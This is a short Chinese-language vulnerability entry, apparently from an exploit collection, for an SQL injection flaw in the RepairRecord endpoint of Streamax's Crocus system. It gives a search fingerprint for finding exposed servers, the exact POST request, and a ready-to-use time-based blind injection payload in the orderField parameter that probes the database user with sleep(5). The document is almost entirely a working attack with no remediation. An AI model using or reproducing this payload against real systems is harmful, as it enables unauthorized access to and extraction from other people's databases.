# 锐明技术Crocus系统RepairRecord存在SQL注入漏洞

锐明技术Crocus系统 ｜ SQL注入 ｜ —
- **指纹**：`body="/ThirdResource/respond/respond.min.js"`
- **请求**：`POST /RepairRecord.do?Action=QueryLast HTTP/1.1`

**Payload**
```
EndTime=2025-01-20+00%3A00%3A00&PageIndex=0&PageSize=20&RepairState=-1&StartTime=2025-11-26+00%3A00%3A00&orderField=(select*from(select%09if(ascii(substr(current_user,1,1))>1,sleep(5),1))a)&orderType=asc
```
- **响应特征**：200